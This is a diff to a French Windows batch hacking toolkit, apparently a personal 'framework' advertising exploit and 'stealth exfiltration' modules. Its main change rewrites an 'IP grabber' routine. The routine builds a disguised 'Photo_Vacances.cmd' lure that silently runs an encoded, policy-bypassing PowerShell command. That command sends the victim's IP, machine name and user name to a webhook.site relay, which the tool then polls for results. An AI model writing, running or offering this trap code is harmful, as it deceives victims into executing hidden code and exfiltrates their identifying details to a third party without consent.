@@ -7,6 +7,9 @@ set "SCRIPT_DIR=%~dp0"
 if "%SCRIPT_DIR:~-1%"=="\" set "SCRIPT_DIR=%SCRIPT_DIR:~0,-1%"
 cd /d "%SCRIPT_DIR%"
 
+REM --- DESACTIVATION DU MODE SELECTION (QUICKEDIT) POUR EVITER LES PAUSES ---
+powershell -NoProfile -Command "$h = Get-Host; $r = $h.UI.RawUI; $m = $r.WindowTitle; $p = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -match 'mscorlib' }; $t = $p.GetType('Microsoft.Win32.Win32Native'); $k = [IntPtr]::Zero; if ($t) { $s = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() }" >nul 2>&1
+
 REM --- INITIALISATION DES COULEURS ANSI ---
 for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do set "ESC=%%b"
 set "R=%ESC%[91m"
@@ -31,11 +34,7 @@ if %errorlevel% neq 0 (
     echo.
     echo %Y%    [i] Relancement automatique en mode Administrateur...%N%
     echo.
-    echo %B%    [ %G%■■■■■■%B%■■■■■■■■■■■■■■■■■ ]%N%
-    timeout /t 1 /nobreak >nul
-    echo %B%    [ %G%■■■■■■■■■■■■%B%■■■■■■■■■■■ ]%N%
-    timeout /t 1 /nobreak >nul
-    echo %B%    [ %G%■■■■■■■■■■■■■■■■■■%B%■■■■■ ]%N%
+    echo %B%    [ %G%■■■■■■■■■■■■■■■■■■■■■■■■ %B%]%N%
     powershell -Command "Start-Process '%~f0' -Verb RunAs"
     exit /b
 )
@@ -67,9 +66,6 @@ if defined SAFEBOOT_OPTION goto sys_safemode
 
 REM --- INITIALISATION DES MODULES ---
 echo %G%[ SYSTEM ]%N% Powering up framework...
-timeout /t 1 /nobreak >nul
-
-REM --- CHARGEMENT DES CREDENTIALS ---
 set "CRED_FILE=%SCRIPT_DIR%\credentials.txt"
 set "SMTP_USER="
 set "SMTP_PASS="
@@ -84,14 +80,10 @@ if exist "%CRED_FILE%" (
 ) else (
     (echo SMTP_USER=& echo SMTP_PASS=& echo EMAIL_TO=) > "%CRED_FILE%"
 )
-
 echo %G%[ MODULE ]%N% Web-Exploit Database loaded.
-timeout /t 1 /nobreak >nul
 echo %G%[ MODULE ]%N% Stealth Exfiltration Bot active.
-timeout /t 1 /nobreak >nul
 echo.
 echo %Y%[ i ] Initialisation terminée. Bienvenue, ALEEXLEDEV.%N%
-timeout /t 1 /nobreak >nul
 
 REM --- CHARGEMENT DE LA BASE D'OUTILS ---
 
@@ -1419,11 +1411,6 @@ set "opts=TRIAGE - Diagnostic rapide de connexion;ADAPTATEURS - Infos MAC et vit
 call :DynamicMenu "CYBERSECURITE RESEAU" "%opts%" "NONUMS"
 set "cyber_choice=%errorlevel%"
 
-if "%cyber_choice%"=="0" goto menu_principal
-if "%cyber_choice%"=="1" goto cyber_triage
-if "%cyber_choice%"=="2" goto cyber_adapter_audit
-if "%cyber_choice%"=="3" goto cyber_lan_scan
-if "%cyber_choice%"=="4" goto cyber_flux_analysis
 if "%cyber_choice%"=="5" goto cyber_dns_leak
 if "%cyber_choice%"=="6" goto cyber_wifi_audit
 if "%cyber_choice%"=="7" goto cyber_ip_grabber
@@ -1431,6 +1418,7 @@ if "%cyber_choice%"=="8" goto menu_principal
 goto net_cyber_menu
 
 :cyber_ip_grabber
+cls
 echo.
 echo  ================================================
 echo   IP GRABBER FURTIF (MULTI-METHODES)
@@ -1454,38 +1442,65 @@ echo  [i] Connexion au relai et generation du piege en cours...
 set "PS_GRAB_FILE=%TEMP%\ig_listen.ps1"
 if exist "%PS_GRAB_FILE%" del /f /q "%PS_GRAB_FILE%"
 
->  "%PS_GRAB_FILE%" echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
->> "%PS_GRAB_FILE%" echo try { $tk = Invoke-RestMethod -Method Post 'https://webhook.site/token' -EA Stop } catch { Write-Host '  [!] Echec connexion relai.' -f Red; pause; exit }
->> "%PS_GRAB_FILE%" echo $id = $tk.uuid; $url = 'https://webhook.site/' + $id; $api = 'https://webhook.site/token/' + $id + '/requests'
+>  "%PS_GRAB_FILE%" echo $Host.UI.RawUI.FlushInputBuffer()
+>> "%PS_GRAB_FILE%" echo try {
+>> "%PS_GRAB_FILE%" echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+>> "%PS_GRAB_FILE%" echo $tk = Invoke-RestMethod -Method Post 'https://webhook.site/token' -TimeoutSec 10 -EA Stop
+>> "%PS_GRAB_FILE%" echo $id = $tk.uuid
+>> "%PS_GRAB_FILE%" echo if (-not $id) { throw 'UUID vide' }
+>> "%PS_GRAB_FILE%" echo $url = 'https://webhook.site/' + $id
+>> "%PS_GRAB_FILE%" echo $api = 'https://webhook.site/token/' + $id + '/requests'
 >> "%PS_GRAB_FILE%" echo $desk = [Environment]::GetFolderPath('Desktop') + '\Photo_Vacances.cmd'
->> "%PS_GRAB_FILE%" echo $pl = "try { `$ip=(Invoke-RestMethod 'https://icanhazip.com' -UseBasicParsing).Trim(); `$b=@{ip=`$ip;pc=`$env:COMPUTERNAME;usr=`$env:USERNAME} ^| ConvertTo-Json; Invoke-RestMethod -Uri '$url' -Method Post -Body `$b -ContentType 'application/json' -UseBasicParsing } catch {}"
+>> "%PS_GRAB_FILE%" echo $pl = "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; try { Invoke-RestMethod -Uri ('" + $url + "/' + ``$env:COMPUTERNAME + '/' + ``$env:USERNAME) -UseBasicParsing -EA Stop } catch {}"
 >> "%PS_GRAB_FILE%" echo $bytes = [Text.Encoding]::Unicode.GetBytes($pl); $b64 = [Convert]::ToBase64String($bytes)
->> "%PS_GRAB_FILE%" echo $content = "@echo off`r`nstart /B powershell -w 1 -nop -ep bypass -EncodedCommand $b64`r`nexit"
->> "%PS_GRAB_FILE%" echo Set-Content -Path $desk -Value $content -Encoding ASCII
->> "%PS_GRAB_FILE%" echo Write-Host ''; Write-Host '  [OK] Piege genere : Photo_Vacances.cmd' -f Green
->> "%PS_GRAB_FILE%" echo Write-Host '  [i] En attente de la cible... (Appuyez sur ECHAP pour annuler)' -f DarkYellow; Write-Host ''
->> "%PS_GRAB_FILE%" echo $sp = @('|','/','-','\'); $si = 0; $esc = $false
->> "%PS_GRAB_FILE%" echo while(-not $esc) {
->> "%PS_GRAB_FILE%" echo   if($Host.UI.RawUI.KeyAvailable -and $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27){ $esc=$true; break }
->> "%PS_GRAB_FILE%" echo   try { 
->> "%PS_GRAB_FILE%" echo      $rs = Invoke-RestMethod -Method Get $api -EA Stop
->> "%PS_GRAB_FILE%" echo      if($rs.data.Count -gt 0){
->> "%PS_GRAB_FILE%" echo          $info = $rs.data[0].content ^| ConvertFrom-Json
->> "%PS_GRAB_FILE%" echo          Write-Host ''; Write-Host '  =================================================' -f Red
->> "%PS_GRAB_FILE%" echo          Write-Host ('   IP      : '+$info.ip) -f Cyan
->> "%PS_GRAB_FILE%" echo          Write-Host ('   Machine : '+$info.pc) -f White
->> "%PS_GRAB_FILE%" echo          Write-Host ('   Session : '+$info.usr) -f White
->> "%PS_GRAB_FILE%" echo          Write-Host '  =================================================' -f Red
->> "%PS_GRAB_FILE%" echo          Set-Content -Path "$env:TEMP\captured_ip.txt" -Value $info.ip; break
->> "%PS_GRAB_FILE%" echo      }
+>> "%PS_GRAB_FILE%" echo $cmd = "@echo off``r``nstart /B powershell -w hidden -nop -ep bypass -EncodedCommand $b64``r``nexit"
+>> "%PS_GRAB_FILE%" echo Set-Content -Path $desk -Value $cmd -Encoding ASCII
+>> "%PS_GRAB_FILE%" echo Write-Host ''
+>> "%PS_GRAB_FILE%" echo Write-Host '  [OK] Piege genere : Photo_Vacances.cmd' -f Green
+>> "%PS_GRAB_FILE%" echo Write-Host '  [i] En attente de la cible... (ECHAP pour annuler)' -f DarkYellow
+>> "%PS_GRAB_FILE%" echo Write-Host ''
+>> "%PS_GRAB_FILE%" echo $sp = @('^|','/','-','\'); $si = 0; $esc = $false; $found = $false
+>> "%PS_GRAB_FILE%" echo while (-not $esc -and -not $found) {
+>> "%PS_GRAB_FILE%" echo   if ($Host.UI.RawUI.KeyAvailable) {
+>> "%PS_GRAB_FILE%" echo     if ($Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { $esc = $true; break }
+>> "%PS_GRAB_FILE%" echo   }
+>> "%PS_GRAB_FILE%" echo   try {
+>> "%PS_GRAB_FILE%" echo     $rs = Invoke-RestMethod -Method Get $api -TimeoutSec 5 -EA Stop
+>> "%PS_GRAB_FILE%" echo     if (@($rs.data).Count -gt 0) {
+>> "%PS_GRAB_FILE%" echo       $found = $true
+>> "%PS_GRAB_FILE%" echo       $d = @($rs.data)[0]
+>> "%PS_GRAB_FILE%" echo       $ip_val = $d.ip
+>> "%PS_GRAB_FILE%" echo       $segs = if ($d.url) { $d.url.TrimStart('/').Split('/') } else { @('?','?') }
+>> "%PS_GRAB_FILE%" echo       $pc_val  = if ($segs.Count -ge 2) { $segs[-2] } else { '?' }
+>> "%PS_GRAB_FILE%" echo       $usr_val = if ($segs.Count -ge 1) { $segs[-1] } else { '?' }
+>> "%PS_GRAB_FILE%" echo       Write-Host ''
+>> "%PS_GRAB_FILE%" echo       Write-Host '  =================================================' -f Red
+>> "%PS_GRAB_FILE%" echo       Write-Host ('   IP      : ' + $ip_val)  -f Cyan
+>> "%PS_GRAB_FILE%" echo       Write-Host ('   Machine : ' + $pc_val)  -f White
+>> "%PS_GRAB_FILE%" echo       Write-Host ('   Session : ' + $usr_val) -f White
+>> "%PS_GRAB_FILE%" echo       Write-Host '  =================================================' -f Red
+>> "%PS_GRAB_FILE%" echo       Set-Content "$env:TEMP\captured_ip.txt" -Value $ip_val -Encoding ASCII
+>> "%PS_GRAB_FILE%" echo     }
 >> "%PS_GRAB_FILE%" echo   } catch {}
->> "%PS_GRAB_FILE%" echo   for($i=3; $i -gt 0; $i--) {
->> "%PS_GRAB_FILE%" echo      [Console]::Write("`r  [$($sp[$si %% 4])] Sondage dans ${i}s...   "); $si++
->> "%PS_GRAB_FILE%" echo      Start-Sleep -s 1
->> "%PS_GRAB_FILE%" echo      if($Host.UI.RawUI.KeyAvailable -and $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27){ $esc=$true; break }
+>> "%PS_GRAB_FILE%" echo   if (-not $found) {
+>> "%PS_GRAB_FILE%" echo     $i = 3
+>> "%PS_GRAB_FILE%" echo     while ($i -gt 0) {
+>> "%PS_GRAB_FILE%" echo       [Console]::Write("`r  [$($sp[$si %% 4])] Sondage dans ${i}s...   ")
+>> "%PS_GRAB_FILE%" echo       $si++; $i--
+>> "%PS_GRAB_FILE%" echo       Start-Sleep -Milliseconds 1000
+>> "%PS_GRAB_FILE%" echo       if ($Host.UI.RawUI.KeyAvailable) {
+>> "%PS_GRAB_FILE%" echo         if ($Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { $esc = $true; break }
+>> "%PS_GRAB_FILE%" echo       }
+>> "%PS_GRAB_FILE%" echo     }
 >> "%PS_GRAB_FILE%" echo   }
 >> "%PS_GRAB_FILE%" echo }
->> "%PS_GRAB_FILE%" echo Write-Host ''; if(Test-Path $desk){ Remove-Item $desk -Force -EA SilentlyContinue }
+>> "%PS_GRAB_FILE%" echo if (Test-Path $desk) { Remove-Item $desk -Force -EA SilentlyContinue }
+>> "%PS_GRAB_FILE%" echo if ($found) { Write-Host ''; Write-Host '  [i] Retour automatique dans 4s...' -f DarkGray; Start-Sleep -s 4 }
+>> "%PS_GRAB_FILE%" echo } catch {
+>> "%PS_GRAB_FILE%" echo     Write-Host "  [ERREUR] $($_.Exception.Message)" -f Red
+>> "%PS_GRAB_FILE%" echo     Write-Host '  Retour dans 4s...' -f DarkGray
+>> "%PS_GRAB_FILE%" echo     Start-Sleep -s 4
+>> "%PS_GRAB_FILE%" echo }
 
 powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_GRAB_FILE%"
 if exist "%PS_GRAB_FILE%" del /f /q "%PS_GRAB_FILE%"
@@ -1505,8 +1520,6 @@ if exist "%TEMP%\captured_ip.txt" (
     )
 )
 
-echo.
-pause
 goto net_cyber_menu
 
 :ig_email
